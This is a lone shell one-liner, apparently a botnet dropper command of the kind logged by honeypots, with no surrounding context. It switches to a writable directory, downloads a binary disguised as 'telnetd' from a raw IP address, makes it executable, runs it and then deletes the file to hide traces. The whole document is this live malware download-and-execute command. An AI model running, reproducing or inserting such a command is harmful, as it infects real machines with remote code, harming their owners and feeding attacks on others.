cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.8.149/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
